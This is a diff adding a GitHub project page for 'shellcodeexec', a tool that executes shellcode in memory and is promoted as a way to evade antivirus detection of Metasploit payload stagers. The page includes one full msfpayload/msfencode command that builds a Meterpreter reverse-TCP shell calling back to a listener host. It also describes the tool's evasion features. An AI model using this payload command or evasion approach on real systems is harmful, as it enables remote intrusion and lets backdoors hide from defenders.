@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset='utf-8'>
+
+  <title>inquisb/shellcodeexec @ GitHub</title>
+
+  <style type="text/css">
+    body {
+      margin-top: 1.0em;
+      background-color: #120e81;
+      font-family: Helvetica, Arial, FreeSans, san-serif;
+      color: #ffffff;
+    }
+    #container {
+      margin: 0 auto;
+      width: 700px;
+    }
+    h1 { font-size: 3.8em; color: #edf17e; margin-bottom: 3px; }
+    h1 .small { font-size: 0.4em; }
+    h1 a { text-decoration: none }
+    h2 { font-size: 1.5em; color: #edf17e; }
+    h3 { text-align: center; color: #edf17e; }
+    a { color: #edf17e; }
+    .description { font-size: 1.2em; margin-bottom: 30px; margin-top: 30px; font-style: italic;}
+    .download { float: right; }
+    pre { background: #000; color: #fff; padding: 15px;}
+    hr { border: 0; width: 80%; border-bottom: 1px solid #aaa}
+    .footer { text-align:center; padding-top:30px; font-style: italic; }
+  </style>
+</head>
+
+<body>
+  <a href="http://github.com/inquisb/shellcodeexec"><img style="position: absolute; top: 0; right: 0; border: 0;" src="http://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub" /></a>
+
+  <div id="container">
+
+    <div class="download">
+      <a href="http://github.com/inquisb/shellcodeexec/zipball/master">
+        <img border="0" width="90" src="http://github.com/images/modules/download/zip.png"></a>
+      <a href="http://github.com/inquisb/shellcodeexec/tarball/master">
+        <img border="0" width="90" src="http://github.com/images/modules/download/tar.png"></a>
+    </div>
+
+    <h1><a href="http://github.com/inquisb/shellcodeexec">shellcodeexec</a>
+      <span class="small">by <a href="http://github.com/inquisb">inquisb</a></span></h1>
+
+    <div class="description">
+      Script to execute in memory a sequence of opcodes
+    </div>
+
+    <p>This script and the relevant project files (Makefile and Visual Studio files) allow you to compile the tool once then run your shellcode across
+different architectures and operating systems.
+
+Moreover, it solves a common real world issue: the target system's anti virus software blocking a Metasploit-generated payload stager (either EXE of ELF). Take for instance the following command line:
+
+    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/shikata_ga_nai -o /tmp/payload.exe -t exe
+
+This generates a Metasploit payload stager, payload.exe, that as soon as it lands on the AV-protected target system is recognized as malicious and potentially blocked (depending on the on-access scan settings) by many anti virus products. At the time of writing this text, 21 out 41 anti viruses detect it as malicious - http://goo.gl/HTw7o. By encoding it multiple times with msfencode, less AV softwares detect it, still a lot.
+
+I have been surfing the Net and found some interesting tutorials and guides about packing, compressing, obfuscating and applying IDA-foo to
+portable executables et similar in order to narrow down the number of AV products that can detect it as a malicious file. This is all interesting,
+but does not stop few hard-to-die anti viruses to detect your backdoor.
+
+So the question is, how cool would it be to have a final solution to avoid all this hassle? This is exactly where this tool comes into play!
+
+shellcodeexec:
+
+* Can be compiled and works on POSIX (Linux/Unices) and Windows systems.
+
+* Can be compiled and works on 32-bit and 64-bit architectures.
+
+* As far as I know, no AV detect it as malicious.
+
+* Works in DEP/NX-enabled environments: it allocates the memory page where it stores the shellcode as +rwx - Readable Writable and eXecutable.
+
+* It supports alphanumeric encoded payloads: you can pipe your binary-encoded shellcode (generated for instance with Metasploit's msfpayload) to Metasploit's msfencode to encode it with the alpha_mixed encoder. Set the BufferRegister variable to EAX registry where the address in memory of the shellcode will be stored, to avoid get_pc() binary stub to be prepended to the shellcode.
+
+* Spawns a new thread where the shellcode is executed in a structure exception handler (SEH) so that if you wrap shellcodeexec into your own executable, it avoids the whole process to crash in case of unexpected behaviours.</p><h2>License</h2>
+<p>Lesser General Public License version 2</p>
+<h2>Authors</h2>
+<p>Bernardo Damele A. G. (bernardo.damele@gmail.com)<br/><br/>      </p>
+<h2>Contact</h2>
+<p>Bernardo Damele A. G. (bernardo.damele@gmail.com)<br/>      </p>
+
+
+    <h2>Download</h2>
+    <p>
+      You can download this project in either
+      <a href="http://github.com/inquisb/shellcodeexec/zipball/master">zip</a> or
+      <a href="http://github.com/inquisb/shellcodeexec/tarball/master">tar</a> formats.
+    </p>
+    <p>You can also clone the project with <a href="http://git-scm.com">Git</a>
+      by running:
+      <pre>$ git clone git://github.com/inquisb/shellcodeexec</pre>
+    </p>
+
+    <div class="footer">
+      get the source code on GitHub : <a href="http://github.com/inquisb/shellcodeexec">inquisb/shellcodeexec</a>
+    </div>
+
+  </div>
+
+  
+</body>
+</html>
